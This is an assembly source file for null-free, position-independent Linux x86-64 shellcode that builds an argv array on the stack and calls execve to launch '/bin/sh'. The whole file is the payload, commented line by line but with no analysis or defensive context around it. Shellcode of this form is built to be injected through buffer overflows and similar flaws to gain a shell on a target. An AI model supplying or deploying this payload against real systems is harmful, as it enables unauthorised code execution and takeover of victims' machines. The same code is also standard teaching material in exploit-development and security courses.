; Linux x64 execve("/bin/sh", NULL, NULL)
; Position Independent Code (PIC)
; Null-free shellcode

section .text
global _start

_start:
    ; Clear RDX (envp = NULL)
    xor rdx, rdx
    
    ; Push NULL terminator
    push rdx
    
    ; Push "/bin//sh" (8 bytes)
    mov rbx, '/bin//sh'
    push rbx
    
    ; Set RDI to point to "/bin//sh"
    mov rdi, rsp
    
    ; Push NULL (argv[1])
    push rdx
    
    ; Push pointer to "/bin//sh" (argv[0])
    push rdi
    
    ; Set RSI to point to argv
    mov rsi, rsp
    
    ; Set RAX to execve syscall number
    xor rax, rax
    mov al, 59          ; execve syscall
    
    ; Execute syscall
    syscall
